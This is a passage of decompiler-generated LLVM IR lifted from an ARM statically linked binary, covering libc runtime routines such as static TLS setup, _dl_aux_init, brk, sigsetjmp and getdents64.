  %v1_18bfc = trunc i32 %v0_18bfc to i8
  %v2_18bfc = load i32, i32* %r4.global-to-local, align 4
  %v3_18bfc = add i32 %v2_18bfc, 20
  %v4_18bfc = inttoptr i32 %v3_18bfc to i8*
  store i8 %v1_18bfc, i8* %v4_18bfc, align 1
  %v0_18c00 = load i32, i32* %r4.global-to-local, align 4
  %v1_18c00 = add i32 %v0_18c00, 8
  store i32 %v1_18c00, i32* @r4, align 4
  %v0_18c04 = call i32 @memcpy()
  %v0_18c0c = load i32, i32* @r4, align 4
  %v1_18c0c = load i32, i32* @r5, align 4
  %v2_18c0c = inttoptr i32 %v1_18c0c to i32*
  store i32 %v0_18c0c, i32* %v2_18c0c, align 4
  %v0_18c10 = load i32, i32* @r5, align 4
  store i32 %v0_18c10, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_18c10, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_14500.563 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_18c24 = load i32, i32* %sl.global-to-local, align 4
  %v2_18c24 = add i32 %v0_18c24, 84
  %v3_18c24 = inttoptr i32 %v2_18c24 to i32*
  %v4_18c24 = load i32, i32* %v3_18c24, align 4
  store i32 %v4_18c24, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10744, i32* %r1.global-to-local, align 4
  %v2_18c30 = add i32 %v0_18c24, 60
  %v3_18c30 = inttoptr i32 %v2_18c30 to i32*
  %v4_18c30 = load i32, i32* %v3_18c30, align 4
  store i32 %v4_18c30, i32* %r0.global-to-local, align 4
  %v3_18c38 = add i32 %v0_18c24, 10744
  %v4_18c38 = inttoptr i32 %v3_18c38 to i32*
  store i32 64, i32* %v4_18c38, align 4
  %v1_18c40 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c40 = add i32 %v1_18c40, 20
  %v3_18c40 = inttoptr i32 %v2_18c40 to i32*
  store i32 %stack_var_-44.3, i32* %v3_18c40, align 4
  %v1_18c48 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c48 = add i32 %v1_18c48, 24
  %v3_18c48 = inttoptr i32 %v2_18c48 to i32*
  store i32 %stack_var_-48.3, i32* %v3_18c48, align 4
  %v1_18c50 = load i32, i32* %r0.global-to-local, align 4
  %v2_18c50 = inttoptr i32 %v1_18c50 to i32*
  store i32 1, i32* %v2_18c50, align 4
  %v1_18c58 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c58 = add i32 %v1_18c58, 28
  %v3_18c58 = inttoptr i32 %v2_18c58 to i32*
  store i32 %stack_var_-52.3, i32* %v3_18c58, align 4
  %v0_18c60 = load i32, i32* @r6, align 4
  %v2_18c60 = icmp eq i32 %v0_18c60, 0
  %v1_18c64 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c64 = add i32 %v1_18c64, 44
  %v3_18c64 = inttoptr i32 %v2_18c64 to i32*
  store i32 1, i32* %v3_18c64, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_18c6c = load i32, i32* %sl.global-to-local, align 4
  %v1_18c6c = load i32, i32* %r1.global-to-local, align 4
  %v2_18c6c = add i32 %v1_18c6c, %v0_18c6c
  store i32 %v2_18c6c, i32* %r2.global-to-local, align 4
  %v1_18c70 = load i32, i32* @r6, align 4
  br i1 %v2_18c60, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_18b84
  store i32 %v1_18c70, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_18c7c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c7c35 = add i32 %v1_18c7c34, 32
  %v3_18c7c36 = inttoptr i32 %v2_18c7c35 to i32*
  store i32 %v1_18c70, i32* %v3_18c7c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_18b84
  %v2_18c74 = add i32 %v1_18c70, -1
  store i32 %v2_18c74, i32* %r0.global-to-local, align 4
  %v1_18c7c = load i32, i32* %r8.global-to-local, align 4
  %v2_18c7c = add i32 %v1_18c7c, 32
  %v3_18c7c = inttoptr i32 %v2_18c7c to i32*
  store i32 %v1_18c70, i32* %v3_18c7c, align 4
  %v1_18c80 = load i32, i32* @r6, align 4
  store i32 %v1_18c80, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_18c84 = load i32, i32* %r8.global-to-local, align 4
  %v1_18c84 = load i32, i32* %r2.global-to-local, align 4
  %v2_18c84 = add i32 %v1_18c84, 28
  %v3_18c84 = inttoptr i32 %v2_18c84 to i32*
  store i32 %v0_18c84, i32* %v3_18c84, align 4
  %v0_18c88 = load i32, i32* %r2.global-to-local, align 4
  %v1_18c88 = load i32, i32* %ip.global-to-local, align 4
  %v2_18c88 = inttoptr i32 %v1_18c88 to i32*
  store i32 %v0_18c88, i32* %v2_18c88, align 4
  %v0_18c8c = load i32, i32* %r0.global-to-local, align 4
  %v1_18c8c = load i32, i32* %r3.global-to-local, align 4
  %v2_18c8c = add i32 %v1_18c8c, %v0_18c8c
  store i32 %v2_18c8c, i32* %r0.global-to-local, align 4
  %v1_18c90 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_18c60, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_18c98.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_18c98 = phi i32 [ %v0_18c98.pre, %._crit_edge ], [ %v1_18c90, %bb54 ]
  %v2_18c94 = udiv i32 %v2_18c8c, %v1_18c90
  %v2_18c98 = load i32, i32* %sb.global-to-local, align 4
  %v3_18c98 = mul i32 %v2_18c94, %v0_18c98
  %v4_18c98 = add i32 %v2_18c98, %v3_18c98
  store i32 %v4_18c98, i32* @r0, align 4
  %v0_18c9c = load i32, i32* %fp.global-to-local, align 4
  %v2_18c9c = icmp ult i32 %v0_18c9c, 16
  %v0_18c9c. = select i1 %v2_18c9c, i32 16, i32 %v0_18c9c
  store i32 %v0_18c9c., i32* @r1, align 4
  %v2_18cac = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_18cac, i32* @r4, align 4
  store i32 %v6_18ac8, i32* @r5, align 4
  store i32 %v15_18ac8, i32* %r8.global-to-local, align 4
  store i32 %v18_18ac8, i32* %sb.global-to-local, align 4
  store i32 %v21_18ac8, i32* %sl.global-to-local, align 4
  store i32 %v24_18ac8, i32* %fp.global-to-local, align 4
  store i32 %v27_18ac8, i32* @lr, align 4
  %v0_18cb0 = call i32 @init_static_tls()
  store i32 %v0_18cb0, i32* %r0.global-to-local, align 4
  %v0_18cbc.pre = load i32, i32* @ip, align 4
  %v1_18b84.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_18b94.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18cb4

dec_label_pc_18b40.dec_label_pc_18cb4.loopexit_crit_edge: ; preds = %dec_label_pc_18b3c
  br label %dec_label_pc_18cb4.loopexit

dec_label_pc_18cb4.loopexit:                      ; preds = %dec_label_pc_18b40.dec_label_pc_18cb4.loopexit_crit_edge, %dec_label_pc_18af4
  br label %dec_label_pc_18cb4

dec_label_pc_18cb4:                               ; preds = %dec_label_pc_18cb4.loopexit, %entry, %bb55
  %v0_18b94.pre.pre = phi i32 [ ptrtoint (i32* @global_var_23010.366 to i32), %dec_label_pc_18cb4.loopexit ], [ ptrtoint (i32* @global_var_23010.366 to i32), %entry ], [ %v0_18b94.pre.pre.pre, %bb55 ]
  %v1_18b84.pre.pre = phi i32 [ %v0_18ae8, %dec_label_pc_18cb4.loopexit ], [ %v0_18ae8, %entry ], [ %v1_18b84.pre.pre.pre, %bb55 ]
  %v0_18cbc = phi i32 [ %v0_18aec, %dec_label_pc_18cb4.loopexit ], [ %v0_18aec, %entry ], [ %v0_18cbc.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_18cbc, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_18b80

; uselistorder directives
  uselistorder i32 %v0_18cbc, { 1, 0 }
  uselistorder i32 %v1_18c70, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18bdc, { 1, 0 }
  uselistorder i32 %v2_18bd8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_18b3c, { 2, 1, 0 }
  uselistorder i32 %v3_18b14, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_18b1c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_18b40, { 1, 0 }
  uselistorder i32 %v0_18aec, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_18ae8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18adc, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10744, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 2, 3, 7, 4, 5, 8, 6, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_18cb4, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_18b84, { 1, 0 }
  uselistorder label %dec_label_pc_18b80, { 1, 0 }
  uselistorder label %dec_label_pc_18b04, { 1, 0 }
}

define i32 @function_18cd4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_18cd4:
  %v0_18cd4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18cd4, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_18cd4
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_18cd4
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_18d00 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_18d00
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r2.global-to-local, align 4
  %v4_18d10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 156) to i32*), align 4
  %v4_18d18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 104) to i32*), align 4
  store i32 %v4_18d18, i32* %r1.global-to-local, align 4
  %v1_18d1c = add i32 %arg1, 44
  %v2_18d1c = inttoptr i32 %v1_18d1c to i32*
  %v3_18d1c = load i32, i32* %v2_18d1c, align 4
  %v1_18d20 = add i32 %arg1, 28
  %v2_18d20 = inttoptr i32 %v1_18d20 to i32*
  %v3_18d20 = load i32, i32* %v2_18d20, align 4
  store i32 %v3_18d20, i32* %r2.global-to-local, align 4
  %v2_18d24 = inttoptr i32 %v4_18d10 to i32*
  store i32 %v3_18d1c, i32* %v2_18d24, align 4
  %v0_18d28 = load i32, i32* %r2.global-to-local, align 4
  %v1_18d28 = load i32, i32* %r1.global-to-local, align 4
  %v2_18d28 = inttoptr i32 %v1_18d28 to i32*
  store i32 %v0_18d28, i32* %v2_18d28, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 5, 9, 3, 6, 4, 7, 8 }
  uselistorder i32 156, { 0, 1, 3, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_18d34(i32 %arg1) local_unnamed_addr {
dec_label_pc_18d34:
  %v0_18d34 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18d34, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18d34
  %v1_18d34 = load i32, i32* @ip, align 4
  %v3_18d34 = mul i32 %v1_18d34, %arg1
  %v2_18d38 = load i32, i32* @r8, align 4
  %v4_18d38 = and i32 %v2_18d38, %v3_18d34
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18d34, %bb
  %v5_18d38 = phi i32 [ %arg1, %dec_label_pc_18d34 ], [ %v4_18d38, %bb ]
  ret i32 %v5_18d38

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_18d44 = add i32 %arg1, 40
  store i32 %v1_18d44, i32* %r2.global-to-local, align 4
  %v1_18d48 = inttoptr i32 %v1_18d44 to i32*
  %v2_18d48 = load i32, i32* %v1_18d48, align 4
  store i32 %v2_18d48, i32* %r2.global-to-local, align 4
  %v3_18d48 = add i32 %arg1, 44
  %v4_18d48 = inttoptr i32 %v3_18d48 to i32*
  %v5_18d48 = load i32, i32* %v4_18d48, align 4
  store i32 %v5_18d48, i32* %r3.global-to-local, align 4
  %v0_18d4c = call i32 @__aeabi_read_tp()
  %v1_18d50 = inttoptr i32 %v0_18d4c to i32*
  %v2_18d50 = load i32, i32* %v1_18d50, align 4
  store i32 %v2_18d50, i32* %r1.global-to-local, align 4
  %v3_18d54 = mul i32 %v5_18d48, 8
  store i32 %v3_18d54, i32* %r3.global-to-local, align 4
  %v1_18d58 = load i32, i32* %r2.global-to-local, align 4
  %v2_18d58 = add i32 %v1_18d58, %v0_18d4c
  %v3_18d5c = add i32 %v3_18d54, %v2_18d50
  %v4_18d5c = inttoptr i32 %v3_18d5c to i32*
  store i32 %v2_18d58, i32* %v4_18d5c, align 4
  %v0_18d60 = load i32, i32* %r3.global-to-local, align 4
  %v1_18d60 = load i32, i32* %r1.global-to-local, align 4
  %v2_18d60 = add i32 %v1_18d60, %v0_18d60
  store i32 %v2_18d60, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_18d68 = add i32 %v2_18d60, 4
  %v5_18d68 = inttoptr i32 %v4_18d68 to i8*
  store i8 1, i8* %v5_18d68, align 1
  %v0_18d6c = load i32, i32* @r4, align 4
  %v1_18d6c = add i32 %v0_18d6c, 20
  store i32 %v1_18d6c, i32* %r1.global-to-local, align 4
  %v1_18d70 = inttoptr i32 %v1_18d6c to i32*
  %v2_18d70 = load i32, i32* %v1_18d70, align 4
  store i32 %v2_18d70, i32* @r1, align 4
  %v3_18d70 = add i32 %v0_18d6c, 24
  %v4_18d70 = inttoptr i32 %v3_18d70 to i32*
  %v5_18d70 = load i32, i32* %v4_18d70, align 4
  store i32 %v5_18d70, i32* %r2.global-to-local, align 4
  %v5_18d74 = call i32 @__GI_mempcpy(i32 %v2_18d58, i32 %v2_18d70, i32 %v5_18d70, i32 1)
  %v0_18d78 = load i32, i32* @r4, align 4
  %v1_18d78 = add i32 %v0_18d78, 28
  store i32 %v1_18d78, i32* %r3.global-to-local, align 4
  %v1_18d7c = inttoptr i32 %v1_18d78 to i32*
  %v2_18d7c = load i32, i32* %v1_18d7c, align 4
  store i32 %v2_18d7c, i32* %r2.global-to-local, align 4
  %v3_18d7c = add i32 %v0_18d78, 24
  %v4_18d7c = inttoptr i32 %v3_18d7c to i32*
  %v5_18d7c = load i32, i32* %v4_18d7c, align 4
  store i32 %v5_18d7c, i32* %r3.global-to-local, align 4
  %v2_18d80 = sub i32 %v5_18d7c, %v2_18d7c
  store i32 %v2_18d80, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18d88 = inttoptr i32 %v5_18d74 to i8*
  %v4_18d88 = call i32 @__GI_memset(i8* %v3_18d88, i32 0, i32 %v2_18d80)
  ret i32 %v4_18d88

; uselistorder directives
  uselistorder i32 %v3_18d54, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_18dd8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 11572) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_18dec = load i32, i32* @r0, align 4
  %v1_18df0 = inttoptr i32 %v0_18dec to i32*
  %v2_18df0 = load i32, i32* @r4, align 4
  store i32 %v2_18df0, i32* %v1_18df0, align 4
  %v3_18df0 = add i32 %v0_18dec, 4
  %v4_18df0 = inttoptr i32 %v3_18df0 to i32*
  %v5_18df0 = load i32, i32* @r5, align 4
  store i32 %v5_18df0, i32* %v4_18df0, align 4
  %v6_18df0 = add i32 %v0_18dec, 8
  %v7_18df0 = inttoptr i32 %v6_18df0 to i32*
  %v8_18df0 = load i32, i32* @r6, align 4
  store i32 %v8_18df0, i32* %v7_18df0, align 4
  %v9_18df0 = add i32 %v0_18dec, 12
  %v10_18df0 = inttoptr i32 %v9_18df0 to i32*
  %v11_18df0 = load i32, i32* @r7, align 4
  store i32 %v11_18df0, i32* %v10_18df0, align 4
  %v12_18df0 = add i32 %v0_18dec, 16
  %v13_18df0 = inttoptr i32 %v12_18df0 to i32*
  %v14_18df0 = load i32, i32* @r8, align 4
  store i32 %v14_18df0, i32* %v13_18df0, align 4
  %v15_18df0 = add i32 %v0_18dec, 20
  %v16_18df0 = inttoptr i32 %v15_18df0 to i32*
  %v17_18df0 = load i32, i32* @sb, align 4
  store i32 %v17_18df0, i32* %v16_18df0, align 4
  %v18_18df0 = add i32 %v0_18dec, 24
  %v19_18df0 = inttoptr i32 %v18_18df0 to i32*
  %v20_18df0 = load i32, i32* @sl, align 4
  store i32 %v20_18df0, i32* %v19_18df0, align 4
  %v21_18df0 = add i32 %v0_18dec, 28
  %v22_18df0 = inttoptr i32 %v21_18df0 to i32*
  %v23_18df0 = load i32, i32* @fp, align 4
  store i32 %v23_18df0, i32* %v22_18df0, align 4
  %v24_18df0 = add i32 %v0_18dec, 32
  %v25_18df0 = inttoptr i32 %v24_18df0 to i32*
  %v27_18df0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_18df0, i32* %v25_18df0, align 4
  %v28_18df0 = add i32 %v0_18dec, 36
  %v29_18df0 = inttoptr i32 %v28_18df0 to i32*
  %v30_18df0 = load i32, i32* @lr, align 4
  store i32 %v30_18df0, i32* %v29_18df0, align 4
  %v0_18df4 = call i32 @__sigjmp_save()
  ret i32 %v0_18df4

; uselistorder directives
  uselistorder i32 %v0_18dec, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 91, 92, 5, 6, 7, 8, 9, 10, 11, 12, 79, 80, 81, 82, 83, 85, 84, 86, 13, 14, 15, 16, 17, 18, 19, 20, 21, 26, 22, 23, 24, 25, 27, 28, 31, 29, 30, 0, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 1, 2, 3, 4, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 72, 70, 71, 73, 74, 77, 75, 76, 78, 87, 88, 89, 90, 93 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_18dfc = load i32, i32* @r5, align 4
  %v12_18dfc = load i32, i32* @r7, align 4
  %v1_18e00 = add i32 %arg3, 14
  %v2_18e08 = ptrtoint i32* %stack_var_-72 to i32
  %v1_18e0c = and i32 %v1_18e00, -8
  %v2_18e10 = sub i32 %v2_18e08, %v1_18e0c
  %v1_18e14 = add i32 %v2_18e10, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_18e58, label %dec_label_pc_18e3c

dec_label_pc_18e3c:                               ; preds = %entry
  %v1_18e40 = sub i32 0, %arg1
  %v3_18e44 = load i16, i16* @global_var_23068.362, align 2
  %v4_18e44 = sext i16 %v3_18e44 to i32
  %v0_18e48 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18e50 = add i32 %v4_18e44, %v0_18e48
  %v4_18e50 = inttoptr i32 %v3_18e50 to i32*
  store i32 %v1_18e40, i32* %v4_18e50, align 4
  br label %dec_label_pc_18f28

dec_label_pc_18e58:                               ; preds = %entry
  br i1 false, label %dec_label_pc_18f28, label %dec_label_pc_18e60

dec_label_pc_18e60:                               ; preds = %dec_label_pc_18e58
  %v2_18e60 = add i32 %v1_18e14, %arg1
  store i32 %v2_18e60, i32* %r1.global-to-local, align 4
  %v2_18e64 = add i32 %tmp, %arg3
  store i32 %v1_18e14, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18f10

dec_label_pc_18e80:                               ; preds = %dec_label_pc_18f10
  %v1_18e80 = add i32 %v0_18ee0, 16
  %v2_18e80 = inttoptr i32 %v1_18e80 to i16*
  %v3_18e80 = load i16, i16* %v2_18e80, align 2
  %v4_18e80 = zext i16 %v3_18e80 to i32
  %v1_18e84 = add nsw i32 %v4_18e80, -19
  store i32 %v1_18e84, i32* @r2, align 4
  %v1_18e88 = add nuw nsw i32 %v4_18e80, 7
  %v1_18e8c = and i32 %v1_18e88, 131064
  store i32 %v1_18e8c, i32* @ip, align 4
  %v2_18e94 = add i32 %v1_18e8c, %v0_18ee8
  store i32 %v2_18e94, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_18e94, %v2_18e64
  br i1 %tmp24, label %dec_label_pc_18ea0, label %dec_label_pc_18edc

dec_label_pc_18ea0:                               ; preds = %dec_label_pc_18e80
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18ea8 = load i32, i32* %r8.global-to-local, align 4
  %v0_18eac = load i32, i32* %sb.global-to-local, align 4
  %v1_18eb0 = load i32, i32* @sp, align 4
  %v2_18eb0 = inttoptr i32 %v1_18eb0 to i32*
  store i32 0, i32* %v2_18eb0, align 4
  %v4_18eb4 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_18ea8, i32 %v0_18eac)
  %v0_18eb8 = load i32, i32* @r5, align 4
  %v1_18eb8 = load i32, i32* %sl.global-to-local, align 4
  %v9_18eb8 = icmp eq i32 %v0_18eb8, %v1_18eb8
  br i1 %v9_18eb8, label %dec_label_pc_18ec0, label %dec_label_pc_18f24

dec_label_pc_18ec0:                               ; preds = %dec_label_pc_18ea0
  %v0_18ec4 = call i32 @__aeabi_read_tp()
  %v3_18ec8 = load i16, i16* @global_var_23068.362, align 2
  %v4_18ec8 = sext i16 %v3_18ec8 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18ed4 = add i32 %v4_18ec8, %v0_18ec4
  %v4_18ed4 = inttoptr i32 %v3_18ed4 to i32*
  store i32 22, i32* %v4_18ed4, align 4
  br label %dec_label_pc_18f28

dec_label_pc_18edc:                               ; preds = %dec_label_pc_18e80
  %v1_18edc = inttoptr i32 %v0_18ee0 to i32*
  %v2_18edc = load i32, i32* %v1_18edc, align 4
  %v3_18edc = add i32 %v0_18ee0, 4
  %v4_18edc = inttoptr i32 %v3_18edc to i32*
  %v5_18edc = load i32, i32* %v4_18edc, align 4
  store i32 %v5_18edc, i32* @r4, align 4
  %v1_18ee0 = add i32 %v0_18ee0, 8
  store i32 %v1_18ee0, i32* %r8.global-to-local, align 4
  %v1_18ee4 = inttoptr i32 %v1_18ee0 to i32*
  %v2_18ee4 = load i32, i32* %v1_18ee4, align 4
  store i32 %v2_18ee4, i32* %r8.global-to-local, align 4
  %v3_18ee4 = add i32 %v0_18ee0, 12
  %v4_18ee4 = inttoptr i32 %v3_18ee4 to i32*
  %v5_18ee4 = load i32, i32* %v4_18ee4, align 4
  store i32 %v5_18ee4, i32* %sb.global-to-local, align 4
  %v1_18ee8 = inttoptr i32 %v0_18ee8 to i32*
  store i32 %v2_18edc, i32* %v1_18ee8, align 4
  %v3_18ee8 = add i32 %v0_18ee8, 4
  %v4_18ee8 = inttoptr i32 %v3_18ee8 to i32*
  %v5_18ee8 = load i32, i32* @r4, align 4
  store i32 %v5_18ee8, i32* %v4_18ee8, align 4
  %v0_18eec = load i32, i32* %r8.global-to-local, align 4
  %v1_18eec = load i32, i32* @r5, align 4
  %v2_18eec = add i32 %v1_18eec, 8
  %v3_18eec = inttoptr i32 %v2_18eec to i32*
  store i32 %v0_18eec, i32* %v3_18eec, align 4
  %v0_18ef0 = load i32, i32* %sb.global-to-local, align 4
  %v1_18ef0 = load i32, i32* @r5, align 4
  %v2_18ef0 = add i32 %v1_18ef0, 12
  %v3_18ef0 = inttoptr i32 %v2_18ef0 to i32*
  store i32 %v0_18ef0, i32* %v3_18ef0, align 4
  %v0_18ef4 = load i32, i32* @ip, align 4
  %v1_18ef4 = trunc i32 %v0_18ef4 to i16
  %v2_18ef4 = load i32, i32* @r5, align 4
  %v3_18ef4 = add i32 %v2_18ef4, 16
  %v4_18ef4 = inttoptr i32 %v3_18ef4 to i16*
  store i16 %v1_18ef4, i16* %v4_18ef4, align 2
  %v0_18ef8 = load i32, i32* @r7, align 4
  %v1_18ef8 = add i32 %v0_18ef8, 18
  %v2_18ef8 = inttoptr i32 %v1_18ef8 to i8*
  %v3_18ef8 = load i8, i8* %v2_18ef8, align 1
  %v4_18ef8 = zext i8 %v3_18ef8 to i32
  store i32 %v4_18ef8, i32* @r3, align 4
  %v2_18efc = load i32, i32* @r5, align 4
  %v3_18efc = add i32 %v2_18efc, 18
  %v4_18efc = inttoptr i32 %v3_18efc to i8*
  store i8 %v3_18ef8, i8* %v4_18efc, align 1
  %v0_18f00 = call i32 @memcpy()
  %v0_18f04 = load i32, i32* @r7, align 4
  %v1_18f04 = add i32 %v0_18f04, 16
  %v2_18f04 = inttoptr i32 %v1_18f04 to i16*
  %v3_18f04 = load i16, i16* %v2_18f04, align 2
  %v4_18f04 = zext i16 %v3_18f04 to i32
  %v0_18f08 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18f08, i32* @r5, align 4
  %v2_18f0c = add i32 %v4_18f04, %v0_18f04
  store i32 %v2_18f0c, i32* @r7, align 4
  br label %dec_label_pc_18f10

dec_label_pc_18f10:                               ; preds = %dec_label_pc_18e60, %dec_label_pc_18edc
  %v0_18ee8 = phi i32 [ %tmp, %dec_label_pc_18e60 ], [ %v0_18f08, %dec_label_pc_18edc ]
  %v0_18ee0 = phi i32 [ %v1_18e14, %dec_label_pc_18e60 ], [ %v2_18f0c, %dec_label_pc_18edc ]
  %v3_18f14 = icmp ult i32 %v0_18ee0, %v2_18e60
  %v1_18f18 = add i32 %v0_18ee8, 19
  store i32 %v1_18f18, i32* @r0, align 4
  %v1_18f1c = add i32 %v0_18ee0, 19
  store i32 %v1_18f1c, i32* @r1, align 4
  br i1 %v3_18f14, label %dec_label_pc_18e80, label %dec_label_pc_18f24.loopexit

dec_label_pc_18f24.loopexit:                      ; preds = %dec_label_pc_18f10
  %v0_18f24.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18f24

dec_label_pc_18f24:                               ; preds = %dec_label_pc_18f24.loopexit, %dec_label_pc_18ea0
  %v1_18f24 = phi i32 [ %v0_18ee8, %dec_label_pc_18f24.loopexit ], [ %v0_18eb8, %dec_label_pc_18ea0 ]
  %v0_18f24 = phi i32 [ %v0_18f24.pre, %dec_label_pc_18f24.loopexit ], [ %v1_18eb8, %dec_label_pc_18ea0 ]
  %v2_18f24 = sub i32 %v1_18f24, %v0_18f24
  store i32 %v2_18f24, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18f28

dec_label_pc_18f28:                               ; preds = %dec_label_pc_18e58, %dec_label_pc_18ec0, %dec_label_pc_18e3c, %dec_label_pc_18f24
  %v0_18f28 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_18dfc, i32* @r5, align 4
  store i32 %v12_18dfc, i32* @r7, align 4
  ret i32 %v0_18f28

